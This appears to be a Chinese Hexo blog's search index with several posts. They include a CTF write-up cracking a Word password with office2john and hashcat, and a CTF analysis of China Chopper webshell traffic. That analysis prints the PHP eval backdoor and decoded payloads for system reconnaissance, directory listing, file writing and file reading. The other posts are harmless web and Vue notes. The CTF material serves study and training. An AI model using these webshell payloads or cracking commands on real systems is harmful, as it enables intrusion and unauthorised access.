_rels/.rels4:Zip archive data, at least v2.0 to extract, name: customXml/5:Zip archive data, at least v2.0 to extract, name: customXml/_rels/6:Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 296, name: customXml/_rels/item1.xml.rels7:Zip archive data, at least v2.0 to extract, compressed size: 149, uncompressed size: 258, name: customXml/item1.xml8:Zip archive data, at least v2.0 to extract, compressed size: 228, uncompressed size: 327, name: customXml/itemProps1.xml9:Zip archive data, at least v2.0 to extract, name: docProps/10:Zip archive data, at least v2.0 to extract, compressed size: 346, uncompressed size: 624, name: docProps/app.xml11:Zip archive data, at least v2.0 to extract, compressed size: 327, uncompressed size: 633, name: docProps/core.xml12:Zip archive data, at least v2.0 to extract, compressed size: 252, uncompressed size: 383, name: docProps/custom.xml13:Zip archive data, at least v2.0 to extract, compressed size: 162, uncompressed size: 224, name: remember.zip14:Zip archive data, at least v2.0 to extract, name: word/15:Zip archive data, at least v2.0 to extract, name: word/_rels/16:Zip archive data, at least v2.0 to extract, compressed size: 246, uncompressed size: 822, name: word/_rels/document.xml.rels17:Zip archive data, at least v2.0 to extract, compressed size: 3739, uncompressed size: 57660, name: word/document.xml18:Zip archive data, at least v2.0 to extract, compressed size: 682, uncompressed size: 3062, name: word/fontTable.xml19:Zip archive data, at least v2.0 to extract, compressed size: 1026, uncompressed size: 2629, name: word/settings.xml20:Zip archive data, at least v2.0 to extract, compressed size: 2328, uncompressed size: 26902, name: word/styles.xml21:Zip archive data, at least v2.0 to extract, name: word/theme/22:Zip archive data, at least v2.0 to extract, compressed size: 1339, uncompressed size: 6436, name: word/theme/theme1.xml 将该 word 文件后缀改为.zip后解压，拿到remember.zip。解压，打开里面的remember.txt，获取关键信息 2：那天，你告诉了我你最重要的8个数字，我记住了。从中获取关键信息 3：8个数字 4. hashcat 爆破打开舔狗日记2.docx，发现需要密码，再加上前面得知密码为 8 个数字。所以选择使用 hashcat 爆破 word 密码。使用 hashcat 爆破前需要得到 hash 值，所以我们使用 Office2john 获取舔狗日记2.docx的 hash 值（文件路径不能有中文，需要改名）。 在john-1.8.0-jumbo-1\\run目录下执行： python office2john.py 2.docx hash 获取文件 hash，打开删除前面的2.docx:，得到 hash $office$*2007*20*128*16*e8acb3ffadb859fcd9c0f38906f5a9b5*dc0a3deef00efb5fcdc115daa4784734*f97102e56fc53cf48fedba9a927e149d711928b2 可以看到是 2007 版本 office。 在 hashcat 文件夹下执行.\\hashcat.exe --help | findstr Office，获得 office 的 Hash modes。 9400 | MS Office 2007 | Document 9500 | MS Office 2010 | Document 9600 | MS Office 2013 | Document25300 | MS Office 2016 - SheetProtection | Document 9700 | MS Office = 2003 $0/$1, MD5 + RC4 | Document 9710 | MS Office = 2003 $0/$1, MD5 + RC4, collider #1 | Document 9720 | MS Office = 2003 $0/$1, MD5 + RC4, collider #2 | Document 9810 | MS Office = 2003 $3, SHA1 + RC4, collider #1 | Document 9820 | MS Office = 2003 $3, SHA1 + RC4, collider #2 | Document 9800 | MS Office = 2003 $3/$4, SHA1 + RC4 | Document 2007对应9400的 hash 类型，使用 hashcat 爆破，得到关键信息 4：19990821。 .\\hashcat.exe -m 9400 hash -a 3 ?d?d?d?d?d?d?d?d -w 3 -O hashcat 同一个文件如果执行过的会保存记录，需要加--show展示密码 5. docx 隐藏文字输入密码后，打开舔狗日记2.docx，全选文字，并且加深后，会发现出现隐藏文字，关键信息 5：HowCaniForgetyou。 6. bmp 隐写还有一个 bmp 文件最终我不想舔了.bmp没有用到，推测为 bmp 隐写，我们使用软件wbStego4.3open，输入图片路径和密码，得到 txt 文件， 里面为最后的 flag：ACTFTr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve。 此 flag：Tr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve为 Leet speak 加密，解密为TriedToForgetYouButFinallyTurnsToForgive，意为尝试忘记你，但最终选择原谅。 参考文章 ACTF2020 部分 wp HashCat 恢复 Excel、Word、PPT 密码保姆教程","tags":["CTF","图片处理","Misc"],"categories":["CTF"]},{"title":"【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析","path":"//CTF/Misc/traffic_analysis_1.html","content":"考点 Wireshark 流量分析 Php 代码分析 Hex 转写 Jpg zip 文件头 解题过程1. Wireshark 流量分析使用 wireshark 打开 pcapng 文件，筛选 http 流量。 点击文件 - 导出对象 - HTTP Content Type 选择 All Content-Types，然后点击全部保存，选择导出文件夹，导出全部 HTTP 流量。 ALL Content-Types：所有的内容类型。applicationoctet-stream：类型为字节流（二进制文件），浏览器默认方式为下载。applicationx-www-form-urlencoded：将表单内容转化为一种能够通过 URL 传输的形式，将键和值对连结起来，形式接近于 URL 的查询字符串。在这个过程中，特定的字符被替换成 %XX 形式，其中 XX 是对应字符的 ASCII 码的十六进制表示，而空白则被替换成加号（+）。texthtml：内容是 html，浏览器在获取到这种文件时会自动调用 html 的解析器对文件进行相应的处理。 2. php 代码分析查看文件详情 首先找到 1.php ，我们进行分析。aa=@eval\u0001(base64_decode($_POST[action]));action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3Dbase64_decode：以下内容为 base64 编码action：入侵行为，值经过了 base64 编码与 urlencode 编码，通过 CyberChef 双重解码（URL Decode, From Base64）后得到 php 代码格式化后如下// 关闭错误显示@ini_set(display_errors, 0);// 移除脚本执行的时间限制，允许脚本无限期运行@set_time_limit(0);// 关闭魔术引号，该功能会自动在字符串的引号前添加转义字符@set_magic_quotes_runtime(0);// 输出开始分隔符echo -|;// 获取当前脚本的目录路径$D = dirname($_SERVER[SCRIPT_FILENAME]);if ($D == ) // 如果SCRIPT_FILENAME为空，则尝试使用PATH_TRANSLATED $D = dirname($_SERVER[PATH_TRANSLATED]);// 将目录路径添加到变量R，并添加制表符作为分隔$R = $D\\t;// 检查目录路径是否以根目录符号/开头if (substr($D, 0, 1) != /) // 如果不是，遍历A到Z的驱动器，如果存在，则添加到R foreach (range(A, Z) as $L) if (is_dir($L:)) $R .= $L:; // 添加制表符作为分隔 $R .= \\t;// 使用posix_getegid和posix_getpwuid获取当前用户的用户名，如果函数不存在，则使用get_current_user$u = (function_exists(posix_getegid)) ? @posix_getpwuid(@posix_geteuid()) : ;$usr = ($u) ? $u[name] : @get_current_user();// 将系统信息和用户信息添加到R$R .= php_uname();$R .= ($usr);// 打印结果print $R;// 输出结束分隔符echo |-;// 终止脚本执行die();将返回的结果格式化后：-|D:/wamp64/www/uploadC:D:E:Windows NT DESKTOP-5E59GR7 10.0 build 15063 (Windows 10) AMD64(SYSTEM)|-需要注意的点输出的前面有个-|，输出的后面有个|-，可能会影响后续下载文件的内容。查看文件夹D:\\wamp64\\www\\upload 然后查看了文件夹内容以及权限，发现是777，可以下载文件。aa=@eval\u0001(base64_decode($_POST[action]));action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3Daction 如下QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7解码并且格式化后代码为// 关闭错误显示@ini_set(display_errors, 0);// 移除脚本执行的时间限制@set_time_limit(0);// 关闭魔术引号@set_magic_quotes_runtime(0);// 输出开始分隔符echo -|;// 解码通过POST方法传递的路径$D = base64_decode($_POST[z1]);// 尝试打开目录$F = @opendir($D);if ($F === NULL) // 如果目录打开失败，输出错误信息 echo ERROR:// Path Not Found Or No Permission!; else // 初始化变量用于存储目录和文件列表 $M = NULL; $L = NULL; // 读取目录中的每个条目 while ($N = @readdir($F)) $P = $D . / . $N; // 构建完整的文件路径 $T = @date(Y-m-d H:i:s, @filemtime($P)); // 获取文件最后修改时间 $E = substr(base_convert(@fileperms($P), 10, 8), -4); // 获取文件权限 $R = \\t . $T . \\t . @filesize($P) . \\t . $E . ; // 构建输出格式 // 根据是否为目录，将文件或目录信息添加到相应的变量中 if (@is_dir($P)) $M .= $N . / . $R; else $L .= $N . $R; // 输出目录和文件列表 echo $M . $L; // 关闭目录句柄 @closedir($F);// 输出结束分隔符echo |-;// 终止脚本执行die();代码功能为获取文件夹的内容，需要参数z1。此处z1：RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D，解码后为D:\\wamp64\\www\\upload，将返回的结果格式化后：-|./ 2017-12-08 11:38:58\t0\t0777../ 2017-12-08 11:39:10\t4096\t07771.php 2017-12-08 11:33:16\t33\t0666flag.txt 2017-12-08 11:35:29\t17\t0666hello.zip 2017-12-08 09:32:36\t224\t0666|-我们可以注意到有个flag.txt和hello.zip（我们要的flag在中hello.zip，其实flag.txt并没有获取）查看文件夹D:\\wamp64\\www\\ 将z1换为RDpcd2FtcDY0XHd3d1w%3D，解码后为D:\\wamp64\\www\\，将输出格式化后为-|./ 2017-12-08 11:39:10\t4096\t0777../ 2017-11-17 18:15:03\t4096\t0777admin/ 2017-11-17 18:15:53\t8192\t0777install/ 2017-11-17 18:15:54\t4096\t0777tools/ 2017-11-17 18:15:54\t4096\t0777typecho/ 2017-12-08 11:39:10\t4096\t0777upload/ 2017-12-08 11:38:58\t0\t0777usr/ 2017-11-17 18:15:54\t0\t0777var/ 2017-11-17 18:15:54\t4096\t0777.gitattributes 2015-05-02 05:31:05\t386\t0666.gitignore 2015-05-02 05:31:05\t234\t0666.gitmodules 2015-05-02 05:31:05\t0\t0666.travis.yml 2015-05-02 05:31:05\t114\t0666aa.php 2017-10-27 16:02:31\t26\t0666changelog.txt 2015-05-02 05:31:05\t2135\t0666config.inc.php 2017-10-26 14:01:04\t1521\t0666index.php 2015-05-02 05:31:05\t721\t0666install.php 2015-05-02 05:31:05\t47405\t0666license.txt 2015-05-02 05:31:05\t14974\t0666p0.php 2017-10-26 14:31:28\t26\t0666README.md 2015-05-02 05:31:05\t205\t0666todo.txt 2015-05-02 05:31:05\t122\t0666x1n.php 2017-10-26 14:51:13\t27\t0666|-查看文件夹D:\\wamp64\\ 将z1换为RDpcd2FtcDY0XA%3D%3D，解码后为D:\\wamp64\\，结果格式化为-|./ 2017-11-17 18:15:03\t4096\t0777../ 2017-12-08 04:45:53\t4096\t0777alias/ 2017-11-17 18:15:03\t0\t0777apps/ 2017-11-17 18:15:03\t0\t0777bin/ 2017-11-17 18:15:24\t0\t0777cgi-bin/ 2017-11-17 18:15:32\t0\t0777lang/ 2017-11-17 18:15:32\t4096\t0777logs/ 2017-11-17 18:15:32\t0\t0777scripts/ 2017-11-17 18:15:32\t4096\t0777tmp/ 2017-11-27 06:51:26\t40960\t0777www/ 2017-12-08 11:39:10\t4096\t0777barimage.bmp 2010-12-31 01:39:42\t4790\t0666images_off.bmp 2016-08-01 08:21:38\t26934\t0666images_on.bmp 2016-08-01 08:22:36\t26934\t0666install-english.txt 2016-10-16 07:09:46\t3380\t0666license-english.txt 2015-11-06 03:00:26\t8156\t0666read_after_install-english.txt 2016-03-08 11:45:22\t1191\t0666unins000.dat 2017-10-10 07:11:50\t972306\t0666unins000.exe 2017-10-10 07:09:38\t1401105\t0777uninstall_services.bat 2017-10-10 07:09:51\t132\t0777wampmanager.conf 2017-11-14 14:28:47\t1636\t0666wampmanager.exe 2008-09-03 07:46:36\t1233408\t0777wampmanager.ini 2017-12-08 11:33:55\t508782\t0666wampmanager.tpl 2016-08-22 02:42:00\t24039\t0666|- 3. Hex 转写 Jpg接着在D:\\wamp64\\www\\upload文件夹中新建图片6666.jpg，并且写入二进制信息。 写入图片的php代码 action 为 QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw 解码后的 php 为： // 关闭错误显示@ini_set(display_errors, 0);// 移除脚本执行的时间限制@set_time_limit(0);// 关闭魔术引号@set_magic_quotes_runtime(0);// 输出开始分隔符echo -|;// 解码通过POST方法传递的文件路径$f = base64_decode($_POST[z1]);// 获取通过POST方法传递的文件内容$c = $_POST[z2];// 清除可能存在的回车和换行符$c = str_replace(\\r, , $c);$c = str_replace( , , $c);// 初始化缓冲区变量$buf = ;// 将十六进制编码的字符串转换为原始二进制数据for ($i = 0; $i strlen($c); $i += 2) $buf .= urldecode(% . substr($c, $i, 2));// 尝试写入文件，并根据操作结果输出“1”或“0”echo (@fwrite(fopen($f, w), $buf) ? 1 : 0);// 输出结束分隔符echo |-;// 终止脚本执行die(); 输入的参数z1（图片名）为D:\\wamp64\\www\\upload\\6666.jpg，z2为图片的十六进制信息。我们获取到z2后,将其转换为.jpg格式。 # HexToJpg.pydef hex_to_jpg(hex_file_path, jpg_file_path): 将十六进制文本文件转换为JPEG图片文件。 :param hex_file_path: 十六进制文本文件的路径。 :param jpg_file_path: 要保存JPEG图片的路径。 with open(hex_file_path, r) as hex_file: # 从文件中读取十六进制数据 hex_data = hex_file.read() # 删除任何空白字符（空格、换行符等） hex_data = hex_data.replace( , ).replace( , ) # 将十六进制数据转换为二进制数据 binary_data = bytes.fromhex(hex_data) # 将二进制数据写入JPEG文件 with open(jpg_file_path, wb) as jpg_file: jpg_file.write(binary_data)# 示例使用：hex_file_path = r.\\6666.txt # 替换为你的十六进制文件路径jpg_file_path = 6666.jpg # 替换为你希望保存的JPEG文件路径hex_to_jpg(hex_file_path, jpg_file_path) 转换后的图片如下： 拿到关键信息Th1s_1s_p4sswd_!!! 4. zip 文件头接着读取了D:\\wamp64\\www\\upload\\hello.zip文件。 读取zip的php代码 action 为 QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D 解码后脚本为： ?php// 关闭错误显示，防止错误信息泄露@ini_set(display_errors, 0);// 移除脚本执行的时间限制，允许脚本长时间运行@set_time_limit(0);// 关闭魔术引号，防止自动添加转义字符@set_magic_quotes_runtime(0);// 输出开始分隔符，用于标识响应开始echo -|;// 从POST请求中获取base64编码的文件路径，并进行解码$F = base64_decode($_POST[z1]);// 尝试以只读模式打开文件$P = @fopen($F, r);// 检查文件是否成功打开if ($P === false) // 如果文件打开失败，输出错误信息并终止脚本 echo ERROR:// File cannot be opened.; die();// 读取文件内容，filesize($F)获取文件大小，确保读取整个文件echo @fread($P, filesize($F));// 关闭文件句柄，释放资源@fclose($P);// 输出结束分隔符，用于标识响应结束echo |-;// 终止脚本执行die();? 读取 zip 接着的下个 php 文件，即为 zip 文件，我们将后缀修改为.zip，用 WinHex 查看。 注意到zip 文件头多了2D3E7C，文件尾多了7C3C2D，我们将其删除，发现压缩包已经可以正常打开但是有密码。 zip 的文件头由504B0304开头 我们输入前面拿到的关键信息Th1s_1s_p4sswd_!!!后，拿到flag.txt。最终 flag 为flag3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z。 优化点 zip 可以直接用 Binwalk 提取 可以只看 request 头和 response 包体 jpg 文件头由FFD8FF开头，由FFD9结尾，可以快速确定是个图片。 保存图片可以用 WinHex 打开那个报文后，删除多余信息，另存为.jpg文件 参考文章 Misc 第八篇——功夫再高也怕菜刀（数据恢复、报文分析）","tags":["CTF","Misc","流量分析"],"categories":["CTF"]},{"title":"【技术教程】GitHub Pages 自定义域名配置指南","path":"//tutorial/github_domain.html","content":"本文无广告，请放心浏览。文章使用腾讯云仅因为域名购买于腾讯云，购买于其他服务商可参考本文的第2，3步。 笔者默认您已经拥有域名并且完成备案，GitHub Pages 搭建完成。 1. 解析域名添加 DNS 解析打开域名管理页面添加 DNS 记录。 填写说明 主机记录填写您的二级域名 记录类型选择 CNAME 记录值填写您的博客的仓库名，如：xxx.github.io TTL 填写 600（默认值） 2. 仓库创建 CNAME 文件添加 CNAME 文件方法有两种： 【通用】创建 CNAME 文件Github Pages 仓库下新建文件，git 时可能会被覆盖。 【Hexo】创建 CNAME 文件source 文件夹下创建 CNAME 文件，每次 Build 都会生成。 CNAME 文件说明 文件名为：CNAME（全大写，无后缀） 文本内容为：您的二级域名 3. 设置自定义域名Github Pages 仓库中选择 Settings 的 Pages 选项，填写 Custom domain，填写您的二级域名，点击 Save。Github 会检查您的 DNS 配置是否正确，确认后会自动申请 TLS 证书（Let’s Encrtpy）。 开启 HTTPS（推荐）勾选 Enable HTTPS，若无法勾选可以等待 TLS 证书申请成功后再次尝试。 参考文章 GitHub Pages 搭建的博客绑定域名 GitHub Page 绑定自定义域名 + 开启 HTTPS 超详细 Hexo + Github Pages 博客搭建教程","tags":["github","域名","腾讯云"],"categories":["github"]},{"title":"【良心推荐】仅需三分钟，美化你的github文件图标","path":"//recommend/github_file_icons.html","content":"1. GitHub File Icons这是一个 Chrome 插件，安装后即可美化 github 自带文件图标。 Github 链接 商店下载 优化后效果 2. Github 网页图标主题这是一个 Tampermonkey 脚本（使用教程），使用了 vscode-material-icon-theme 主题的 icon，比 GitHub File Icons 的图标更加好看。 Github 链接脚本 greasyfork 安装链接，可以自动安装到 Tampermonkey。 github 脚本下载链接，下载后自行导入 Tampermonkey（导入教程）。 图标库 优化后效果 该脚本优化建议脚本第 165 行，图标使用 jsdelivr 加速。 - const url = `https://raw.githubusercontent.com/PKief/vscode-material-icon-theme/main/icons/$name.svg`+ const url = `https://fastly.jsdelivr.net/gh/material-extensions/vscode-material-icon-theme/icons/$name.svg`","tags":["github","图标美化","优化"],"categories":["github"]},{"title":"【HTML】原生HTML密码管理：集成Toast通知的前端实现","path":"//coding/html/pwd_manager.html","content":"实现的功能 账密展示 原生 Toast 展示复制情况 点击复制 为什么强调原生因为不需要引用第三方库，可以提高保密性并且在无网环境内网环境中使用html 复健 如何使用密码写在 html 中或者引入 pwd.js 若密码写在 html 中，则注释此行script src=./pwd.js/script（默认）若密码单独写在 pwd.js 中，则注释 html 中 pwdInfo 的部分 （便于维护） index.html!DOCTYPE htmlhtml lang=zh head meta charset=UTF-8 / meta http-equiv=X-UA-Compatible content=IE=edge / meta name=viewport content=width=device-width, initial-scale=1.0 / titleMiHoYo Password/title !-- script src=./pwd.js/script -- script const pwdInfo = [ id: 0, name: aaa, phone: 111, password: 111, , id: 1, name: bbb, phone: 222, password: 222, , ]; /script style * font-family: PingFang SC, Helvetic1, sans-serif; padding: 0; margin: 0; .layout height: 100vh; display: flex; justify-content: center; align-items: center; .bigBox margin: auto; display: flex; flex-flow: wrap; justify-content: center; .personBox height: 100px; max-height: 200px; max-width: 300px; display: flex; flex-flow: column; justify-content: center; align-items: start; padding: 8px 20px; margin: 15px; border-radius: 10px; background-color: #4b6f98ef; transition: background-color 0.2s; .personBox:hover background-color: #2b4460; h3 color: #eee; padding-bottom: 3px; a cursor: pointer; padding: 1px 0; font-size: 14px; color: #eee; transition: font-size 0.5s; a:hover font-size: 15px; /* 以下为toast */ /* toast内容样式 */ .toast position: fixed; top: 0; right: 0; margin: 15px; padding: 15px; background-color: white; border-radius: 5px; border: 1px solid #eee; /* 加入边框 */ box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* 加入阴影 */ z-index: 1000; /* 确保toast在顶层 */ .content display: flex; font-weight: bold; font-size: 16px; /* 显示toast的动画 */ .show-toast animation: slideIn 0.5s ease forwards; /* 隐藏toast的动画 */ .hide-toast animation: slideOut 0.5s ease forwards; /* 入场动画 */ @keyframes slideIn from transform: translateX(200px); opacity: 0; to transform: translateX(0); opacity: 1; /* 出场动画 */ @keyframes slideOut from transform: translateX(0); opacity: 1; to transform: translateX(200px); opacity: 0; /style /head body div id=Toast/div div class=layout div class=bigBox/div /div /body script function myCopy(id, info) navigator.clipboard.writeText(pwdInfo[id][info]); showToast(`复制成功：$pwdInfo[id].name的$info`, 1200); let toastNumber = -1; function showToast(content, duration = 1000) toastNumber++; let toast = document.getElementById(Toast); let toastItem = document.createElement(div); toastItem.setAttribute(class, toast); toastItem.style.top = `$toastNumber * 65px`; toastItem.innerHTML = /*html*/ ` div class=content svg style=width:23px;color: rgb(10, 194, 58); xmlns=http://www.w3.org/2000/svg viewBox=0 0 1024 1024path fill=currentColor d=M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896m-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336z/path/svg span style=margin-left:5px$content/span /div `; toast.appendChild(toastItem); // 使用Promise来同步setTimeout function delay(ms) return new Promise((resolve) = setTimeout(resolve, ms)); // 显示toast // 播放开始动画 toastItem.classList.add(show-toast); // 等待 进入动画+duration 时间后播放关闭动画 // toastItem.style.top = `$toastNumber * 65px`; delay(duration + 500).then(() = toastItem.classList.add(hide-toast); toastNumber--; ); // 等待 进入动画+duration+出场动画 时间后播放移除节点 delay(duration + 500 + 500).then(() = if (toastItem) toastItem.remove(); ); bigBox = document.querySelector(.bigBox); pwdInfo.forEach((info) = const showInfo = (category, tag) = return info[category] ? /*html*/ `a class=btn onclick=myCopy($info.id, $category ) $tag:$info[category] /a` : ; ; bigBox.innerHTML += /*html*/ ` div class=personBox h3$info.name/h3 $showInfo(email, Email) $showInfo(phone, Phone) $showInfo(password, Password) /div`; ); /script/html pwd.jsconst pwdInfo = [ id: 0, name: aaa, phone: 111, password: 111, , id: 1, name: bbb, phone: 222, password: 222, ,];","tags":["html","密码管理"],"categories":["html"]},{"title":"Hello World ！！！","path":"//hello.html","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new My New Post More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment"},{"title":"Vue音乐播放器施工进度（2）","path":"//coding/vue/2.html","content":"2022_07_21 施工进度 点击 http://vue_music.bandao.ltd 再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用主要难点：本地要代理访问网易云的 api，线上则不需要自己代理（这里花了两个小时来更正修复 bug：刷新导致 404// vue.config.jsdevServer: proxy: /api: target: https://music.163.com,//这里填入你要请求的接口的前缀 ws: true,//代理websocked changeOrigin: true,//虚拟的站点需要更管origin secure: true, //是否https接口 pathRewrite: ^/api: //重写路径 // footerMusic.vue!-- 本地使用这个，这里用了代理 --!-- audio ref=myAudio :src=`/api/song/media/outer/url?id=$playlist[playlistIndex].id.mp3`/audio --!-- 线上使用这个 --audio ref=myAudio :src=`https://music.163.com/song/media/outer/url?id=$playlist[playlistIndex].id.mp3`/audio 技术点 vuex// store/index.jsmutations: updateIsBtnShow(state, value) state.isBtnShow = value , updatePlaylist(state, value) state.playlist = value , updatePlaylistIndex(state, value) state.playlistIndex = value , , // footerMusic.vueimport mapMutations, mapState from vuexcomputed: ...mapState([playlist, playlistIndex, isBtnShow]), ,methods: ..mapMutations([updateIsBtnShow]),","tags":["网易云","vue","工程","音乐播放器"],"categories":["Vue前端"]},{"title":"Vue音乐播放器施工进度（1）","path":"//coding/vue/1.html","content":"2022-07-20 03:29:47 星期三 Daily 部分音乐没开自动播放好困啊，明天还要练车，绝了此页面随时消失嗷，说不定那天我又把服务器重启了，ngnix 又开不了了，这个页面就 g 了图片放在我另外一个网站上了也是随时会 g 掉明天还要处理一堆拍的照片 2022_07_19 施工进度点击 http://vue_music.bandao.ltd 再点击歌单网址是 http://vue_music.bandao.ltd/itemMusic?id=5349291073 （好像直接点击进不去耶，显示 404 我也没搞懂） 今天做的事情：上面的歌单信息展示部分写了 200 多行，大部分都是样式，写得我自己都要看不懂了已知 bug ： 直接点击链接或者再次刷新会 404，但是本地运行没有这个情况 歌单描述部分的箭头需要更改样式 pc 端显示大概率异常 需要努力的地方： 还需要了解一下 flex 布局 加快学习的速度啊 （原神活动主要都肝完了要好好学习了） 下面是代码部分template img :src=playlist.coverImgUrl alt= class=bgImg van-row justify=space-between align=center class=itemMusicTop van-col span=8 class=itemLeft van-icon name=arrow-left @click=$router.go(-1) size=25 / span歌单/span /van-col van-col span=8 class=itemRight van-icon name=search class=search size=25 / van-icon name=wap-nav class=wap-nav size=25 / /van-col /van-row van-row justify=space-between align=center class=itemMusicCenter van-col span=10 class=imgBox div class=imgBoxAndplayCount span class=playCount svg class=icon aria-hidden=true use xlink:href=#icon-bofang1/use /svg changeCount(playlist.playCount) /span img :src=playlist.coverImgUrl alt= class=coverImg /div /van-col van-col span=14 van-row justify=center class=listInfo van-col span=30 class=title playlist.name /van-col van-col span=30 class=creator img :src=playlist.creator.avatarUrl alt= span playlist.creator.nickname van-icon name=arrow size=15 / /span /van-col van-col span=30 class=description div class=text playlist.description /div van-icon name=arrow size=15 / /van-col /van-row /van-col /van-row van-row justify=space-between align=center class=functionButtons van-col span=6 van-icon name=chat-o size=30 / span playlist.commentCount /span /van-col van-col span=6 van-icon name=share-o size=30 / span playlist.shareCount /span /van-col van-col span=6 van-icon name=down size=30 / span下载/span /van-col van-col span=6 van-icon name=add-o size=30 / span多选/span /van-col /van-row/templatescriptimport getMusicItemList from @/request/api/itemexport default name: itemMusicTop, props: [playlist], setup(props) // console.log(props); // 通过props进行传值，判断如果没有，则从sessionStorage获取 if ((props.playlist.creator = )) try console.log(here); props.playlist.creator = JSON.parse(sessionStorage.getItem(itemDetail)).playlist.creator catch console.log(here); let response = getMusicItemList(playlistId) playlist = response.data.playlist function changeCount(num) if (num = 100000000) // toFixed(1) 小数点后一位 return (num / 100000000).toFixed(1) + 亿 else if 